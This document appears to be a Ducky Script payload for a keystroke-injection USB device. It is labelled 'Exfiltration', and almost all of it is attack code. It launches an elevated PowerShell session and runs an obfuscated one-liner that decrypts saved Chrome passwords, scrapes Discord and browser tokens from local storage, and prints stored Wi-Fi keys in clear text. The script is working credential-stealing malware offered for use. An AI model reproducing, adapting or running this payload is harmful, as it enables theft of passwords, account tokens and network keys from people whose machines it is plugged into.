REM Author: Fastiraz
REM Description: Extracts Discord tokens, WiFi and Chrome passwords with a payload of 2579 characters.
REM Version:	1.0
REM Category:	Exfiltration
DELAY 750
WINDOWS d
DELAY 1500
WINDOWS r
DELAY 1500
STRING powershell
CTRL SHIFT ENTER
DELAY 750
LEFTARROW
DELAY 1100
ENTER
DELAY 1200
ALT y
DELAY 1300
GUI UP
DELAY 1400
STRING $d=Add-Type -A System.Security;$p='public static';$g=""")]$p extern";$i='[DllImport("winsqlite3",EntryPoint="sqlite3_';$m="[MarshalAs(UnmanagedType.LP";$q='(s,i)';$f='(p s,int i)';$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data';$u=[Security.Cryptography.ProtectedData];Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}";$s=[W]::O("$z\\Default\\Login Data",[ref]$d);$t={($args[0]|%{[char]$_})-join''};if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key;$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0);for(;!([W]::S($s)%100)){[W]::T($s,0);[W]::T($s,3);$c=[W]::B($s,5);try{.$t $u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length;$e=[byte[]]::new($k-31);$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e);.$t $e}}};function Find-Tokens{param([string]$p)$t=@();$p+='\Local Storage\leveldb';Get-ChildItem $p|ForEach-Object{$f=$_.Name;if($f -notmatch '\.log$|\.ldb$'){return}$t+=Select-String -Path "$p\$f" -Pattern '([\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84})' -AllMatches|ForEach-Object{$_.Matches.Value}};return $t}$l=[System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData);$r=[System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData);$p=@{'Discord'="$r\Discord";'Discord Canary'="$r\discordcanary";'Discord PTB'="$r\discordptb";'Google Chrome'="$l\Google\Chrome\User Data\Default";'Opera'="$r\Opera Software\Opera Stable";'Brave'="$l\BraveSoftware\Brave-Browser\User Data\Default";'Yandex'="$l\Yandex\YandexBrowser\User Data\Default"};$m="";foreach($pl in $p.Keys){$pa=$p[$pl];if(-not(Test-Path $pa)){continue};$m+="`n**$pl**`n";$t=Find-Tokens -p $pa;if($t.Count -gt 0){$m+=$t -join "`n"}else{$m+='No tokens found.'}}$m;(netsh wlan show profile) -split "`r`n"|ForEach-Object{if($_ -match "All User Profile\s+:\s+(.+)"){$p=$matches[1];Write-Host "Wi-Fi Profile: $p";$o=netsh wlan show profile $p key=clear;$l=$o|Select-String -Pattern "Key Content\s+:\s+(.+)";if($l){Write-Host "Password: $($l.Matches.Groups[1].Value)"}else{Write-Host "Password not found."}}}
ENTER
